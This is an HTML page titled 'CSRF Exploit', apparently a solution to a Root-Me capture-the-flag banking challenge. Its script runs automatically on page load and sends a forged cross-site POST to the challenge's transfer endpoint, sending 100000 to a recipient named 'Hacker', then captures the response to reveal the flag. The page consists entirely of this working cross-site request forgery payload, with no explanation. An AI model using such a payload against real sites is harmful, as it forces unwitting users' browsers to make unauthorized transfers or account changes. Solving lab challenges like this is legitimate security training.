<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit</title>
</head>
<body>
    <script>
        function post(url, params={}){
            var params_post = [];
            for(const key in params){
                params_post.push(`${key}=${params[key]}`);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, false);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send(params_post.join("&"));
            return xhr.responseText;
        }

        function view_flag(){
            let res = post("https://bankme-1.challenges.pro.root-me.org/transfer/", {recipient: "Hacker", amount: "100000"});
            document.getElementById("flag").setAttribute("value", res);
        }

        view_flag();
    </script>
    <input type="text" id="flag" value="">
</body>
</html>
